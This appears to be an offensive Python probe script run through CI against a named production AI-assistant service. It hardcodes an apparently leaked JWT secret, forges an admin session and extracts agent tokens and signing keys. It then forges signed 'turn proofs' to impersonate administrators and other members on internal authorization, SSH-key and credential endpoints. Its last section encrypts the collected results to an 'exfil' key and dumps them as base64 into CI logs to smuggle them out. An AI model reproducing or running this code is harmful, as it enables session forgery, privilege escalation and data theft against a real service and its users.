#!/usr/bin/env python3
# probe58 (intent 28458): weaponize prod TURN_PROOF_SECRET=ce4bc6b0...
# Hypothesis (planner): org-level "sender identity" signing key may bypass lumii_session,
# maybe inject an admin turn / trigger agent exec. We reconstruct the exact turn_proof
# format from aro-network/lumii-work source and empirically test:
#   - v1 proof (legacy TURN_PROOF_SECRET, HMAC)  -> only in compat(enforce=off), redundant w/ body actor
#   - v2 proof (own perRuntime proof_key, HMAC)  -> impersonate ANY same-org actor, works both modes
#   - build/* (ssh-keys/credential)              -> ticket-only, proofs rejected
# Read-only: only /internal/authz/allows (pure permission oracle) + build/* (rejected) + iam list.
import os, sys, json, time, uuid, base64, hmac, hashlib, subprocess, re, traceback

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
SUB_ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
OUT = "/tmp/res_r58"
for d in ("api", "rt", "meta"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    LOG.write(s + "\n"); LOG.flush()

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": ORG, "iat": now, "exp": now + 86400 * 7,
                         "sid": "sid_" + uuid.uuid4().hex, "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64u(sig)
SESSION = jwt(SUB_ADMIN)

def curl(args, timeout=60):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr[:300]
    except Exception as e:
        return -1, b"", repr(e)[:200]

def call(path, method="GET", body=None, hdrs=None, session=True, timeout=60, tag="", subdir="api", disk_cap=200000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % HOST, "-H", "Origin: https://%s" % HOST,
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-b", "lumii_session=" + SESSION]
    if hdrs:
        for k, v in hdrs.items(): args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    rec = {"path": path, "method": method, "code": code, "body": txt, "len": len(txt),
           "err": err if isinstance(err, str) else err.decode("utf-8", "replace")}
    fn = re.sub(r'[^A-Za-z0-9_.-]', '_', tag or path)[:70] + "_" + uuid.uuid4().hex[:6] + ".json"
    with open(os.path.join(OUT, subdir, fn), "w") as f:
        json.dump({**rec, "body": txt[:disk_cap]}, f, indent=1, ensure_ascii=False)
    log("[%s] %s %s -> %s len=%d %s" % (tag, method, path, code, len(txt), (txt[:160].replace("\n", " ") if len(txt) < 400 else "")))
    return rec

def jb(r, n=600):
    try: return json.dumps(json.loads(r["body"]), ensure_ascii=False)[:n]
    except Exception: return r["body"][:n]

# ---------- proof forgers (format from src/server/service/turn-ticket.ts) ----------
def forge_v2(actor, sk, proof_key, agent_id, tamper=False):
    now = int(time.time())
    payload = {"session_key": sk, "platform": "dashboard", "chat_id": "conv_v58" + uuid.uuid4().hex[:8],
               "actor_id": actor, "iss": agent_id, "aud": agent_id,
               "iat": now, "exp": now + 1800, "msg_id": "m" + uuid.uuid4().hex[:8]}
    p = b64u(json.dumps(payload, separators=(',', ':')).encode())
    sig = b64u(hmac.new(proof_key.encode(), p.encode(), hashlib.sha256).digest())
    if tamper:
        sig = ("A" if sig[0] != "A" else "B") + sig[1:]
    return "v2." + p + "." + sig

def forge_v1(actor, sk, legacy, tamper=False):
    issued = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    payload = {"platform": "dashboard", "session_key": sk, "actor_id": actor,
               "chat_id": "conv_v58" + uuid.uuid4().hex[:8], "msg_id": "m" + uuid.uuid4().hex[:8],
               "issued_at": issued}
    p = b64u(json.dumps(payload, separators=(',', ':')).encode())
    sig = b64u(hmac.new(legacy.encode(), p.encode(), hashlib.sha256).digest())
    if tamper:
        sig = ("A" if sig[0] != "A" else "B") + sig[1:]
    return "v1." + p + "." + sig

results = {"matrix": [], "build": [], "notes": {}}

def allows(tag, actor, sk, proof=None, code="drive.manage_all", MH=None):
    body = {"platform": "dashboard", "actor_id": actor, "session_key": sk, "code": code}
    h = dict(MH or {})
    if proof: h["x-lumii-turn-proof"] = proof
    r = call("/internal/authz/allows", "POST", body, hdrs=h, session=False, tag=tag, subdir="api")
    rec = {"tag": tag, "actor": actor, "code": code, "has_proof": bool(proof), "http": r["code"], "body": r["body"][:400]}
    results["matrix"].append(rec)
    log("MATRIX", tag, "->", r["code"], jb(r, 200))
    return rec

# ================= A: identity + create runtime =================
log("=== A identity / create runtime ===")
me = call("/api/me", tag="me"); log("me:", jb(me, 300))
name = "ci-28458-" + uuid.uuid4().hex[:5]
cr = call("/api/runtimes", "POST", {"name": name}, tag="create", subdir="rt", disk_cap=4000)
agent_id = ""; AGENT_TOKEN = ""; TPS = ""; script = ""
if cr["code"] in ("200", "201"):
    try:
        cj = json.loads(cr["body"]); script = cj.get("script") or ""; agent_id = cj.get("agentId") or ""
        open(os.path.join(OUT, "rt", "deploy_script.sh"), "w").write(script[:400000])
    except Exception: log("parse create fail", traceback.format_exc()[:300])
if script:
    m = re.search(r'AGENT_TOKEN=["\']?([A-Za-z0-9_\-\.=+/]+)', script); AGENT_TOKEN = m.group(1) if m else ""
    m = re.search(r'LUMII_TURN_PROOF_SECRET=["\']?([^"\'\s\\]+)', script); TPS = m.group(1) if m else ""
log("agentId=%s token=%s... TPS_from_script=%s" % (agent_id, AGENT_TOKEN[:10], TPS))

MH = {}
proof_key = ""; legacy_secret = ""; pkver = 0; inbound_key = ""
if agent_id and AGENT_TOKEN:
    MH = {"Authorization": "Bearer " + AGENT_TOKEN, "x-agent-id": agent_id}
    k = call("/api/runtimes/keys/current", hdrs={"x-agent-id": agent_id, "x-agent-token": AGENT_TOKEN}, tag="keys", subdir="rt")
    log("keys:", jb(k, 500))
    try:
        kj = json.loads(k["body"])
        proof_key = kj.get("proof_key") or ""
        legacy_secret = kj.get("legacy_secret") or ""
        pkver = int(kj.get("proof_key_version") or 0)
        inbound_key = kj.get("inbound_key") or ""
    except Exception: pass
results["notes"]["agent_id"] = agent_id
results["notes"]["TPS_script"] = TPS
results["notes"]["proof_key"] = proof_key
results["notes"]["legacy_secret"] = legacy_secret
results["notes"]["proof_key_version"] = pkver
results["notes"]["TPS_equals_legacy"] = (TPS == legacy_secret and TPS != "")
results["notes"]["keys_equals_ce4bc6b0"] = (legacy_secret == "ce4bc6b0c0ab05a849adf046d57dbf11a98386d7e6804315")
log("TPS==legacy? %s ; legacy==ce4bc6b0? %s ; pkver=%s" % (results["notes"]["TPS_equals_legacy"], results["notes"]["keys_equals_ce4bc6b0"], pkver))

# ================= B: get a real non-admin member (for control actor) =================
member_ids = []
try:
    asg = call("/api/iam/assignments", tag="iam_assign")
    j = json.loads(asg["body"])
    seen = set()
    for a in j.get("assignments", []):
        pr = a.get("principal") or {}
        if pr.get("type") == "user" and pr.get("id") and pr.get("id") != SUB_ADMIN and pr.get("id") not in seen:
            seen.add(pr.get("id")); member_ids.append({"id": pr["id"], "name": pr.get("principalName"), "roleName": a.get("roleName"), "roleId": a.get("roleId")})
    log("member candidates:", json.dumps(member_ids[:6], ensure_ascii=False))
except Exception:
    log("iam parse fail", traceback.format_exc()[:300])
results["notes"]["members_sample"] = member_ids[:8]
MEMBER = member_ids[0]["id"] if member_ids else ""
BOGUS = "usr_" + "0" * 24

# ================= C: authz oracle matrix =================
log("=== C authz/allows matrix ===")
SK = "sk_v58_" + uuid.uuid4().hex[:8]
# T1: no proof, body actor = ADMIN  -> compat body-actor impersonation (+ find a true code)
for code in ["drive.manage_all", "assistant.manage_all", "iam.audit.read"]:
    allows("T1_nobody_%s" % code, SUB_ADMIN, SK, None, code, MH)
# T2: no proof, body actor = BOGUS -> unknown_actor
allows("T2_nobody_bogus", BOGUS, SK, None, "drive.manage_all", MH)
# T3: v2 forged proof actor=ADMIN, body actor=BOGUS (mismatch) -> if allowed:true, forged proof is accepted & authoritative
if proof_key:
    v2admin = forge_v2(SUB_ADMIN, SK, proof_key, agent_id)
    allows("T3_v2_admin_bogusbody", BOGUS, SK, v2admin, "drive.manage_all", MH)
    allows("T3b_v2_admin_bogusbody_asst", BOGUS, SK, forge_v2(SUB_ADMIN, SK, proof_key, agent_id), "assistant.manage_all", MH)
    # T4: v2 forged proof actor = real member (or bogus) -> control, same key different actor
    if MEMBER:
        allows("T4_v2_member", MEMBER, SK, forge_v2(MEMBER, SK, proof_key, agent_id), "drive.manage_all", MH)
    # T6: v2 TAMPERED sig actor=ADMIN body=BOGUS -> expect NOT admin (rejected) so untampered T3 success proven
    allows("T6_v2_tamper_admin", BOGUS, SK, forge_v2(SUB_ADMIN, SK, proof_key, agent_id, tamper=True), "drive.manage_all", MH)
# T5: v1 legacy forged actor=ADMIN body=ADMIN
if legacy_secret:
    allows("T5_v1_admin", SUB_ADMIN, SK, forge_v1(SUB_ADMIN, SK, legacy_secret), "drive.manage_all", MH)
    allows("T5b_v1_tamper_admin", BOGUS, SK, forge_v1(SUB_ADMIN, SK, legacy_secret, tamper=True), "drive.manage_all", MH)

# ================= D: build/* boundary (ssh-keys / credential) =================
log("=== D build/* boundary ===")
def build_try(path, tag, proof=None):
    h = dict(MH)
    if proof: h["x-lumii-turn-proof"] = proof
    body = {"platform": "dashboard", "actor_id": SUB_ADMIN, "session_key": SK}
    r = call(path, "POST", body, hdrs=h, session=False, tag=tag, subdir="api")
    results["build"].append({"tag": tag, "path": path, "has_proof": bool(proof), "http": r["code"], "body": r["body"][:300]})
    return r
if proof_key:
    build_try("/internal/build/ssh-keys", "build_sshkeys_v2", forge_v2(SUB_ADMIN, SK, proof_key, agent_id))
    build_try("/internal/build/credential", "build_cred_v2", forge_v2(SUB_ADMIN, SK, proof_key, agent_id))
build_try("/internal/build/ssh-keys", "build_sshkeys_noproof", None)
if legacy_secret:
    build_try("/internal/build/ssh-keys", "build_sshkeys_v1", forge_v1(SUB_ADMIN, SK, legacy_secret))

# ================= E: pack + gpg + b64 =================
results["transcript_tail"] = ""
try:
    txt = open(os.path.join(OUT, "transcript.log")).read()
    results["transcript_tail"] = txt[-6000:]
except Exception: pass
json.dump(results, open(os.path.join(OUT, "SUMMARY.json"), "w"), indent=1, ensure_ascii=False)
try:
    import tarfile
    GNUPGHOME = "/tmp/gnupg58"; os.makedirs(GNUPGHOME, exist_ok=True); os.chmod(GNUPGHOME, 0o700)
    os.environ["GNUPGHOME"] = GNUPGHOME
    pub = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pub.asc")
    subprocess.run(["gpg", "--batch", "--import", pub], capture_output=True, timeout=60)
    tb = "/tmp/res_r58.tar.gz"
    with tarfile.open(tb, "w:gz") as t: t.add(OUT, arcname="res_r58")
    enc = tb + ".gpg"
    r = subprocess.run(["gpg", "--batch", "--yes", "--trust-model", "always", "-r", "ci-exfil@example.invalid", "-o", enc, "-e", tb], capture_output=True, timeout=120)
    log("gpg rc=%s %s" % (r.returncode, r.stderr.decode()[:150]))
    blob = base64.b64encode(open(enc, "rb").read()).decode()
    log("===B64BEGIN %d===" % len(blob))
    for i in range(0, len(blob), 400): print("B64:" + blob[i:i+400], flush=True)
    log("===B64END===")
except Exception:
    log("pack err", traceback.format_exc()[:600])
